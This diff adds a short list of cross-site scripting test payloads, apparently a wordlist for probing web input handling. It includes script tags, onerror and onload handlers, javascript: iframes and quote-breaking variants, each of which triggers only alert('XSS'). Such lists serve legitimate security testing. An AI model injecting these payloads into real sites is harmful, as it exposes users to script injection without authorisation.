@@ -1,0 +1,16 @@
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+"><img src=x onerror=alert('XSS')>
+'><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+'><svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+"><iframe src="javascript:alert('XSS')"></iframe>
+<style>*{animation-name: xss;animation-duration:1s}@keyframes xss{}</style>
+"><style>*{animation-name: xss;animation-duration:1s}@keyframes xss{}</style>
+<math><mtext></mtext><script>alert('XSS')</script></math>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
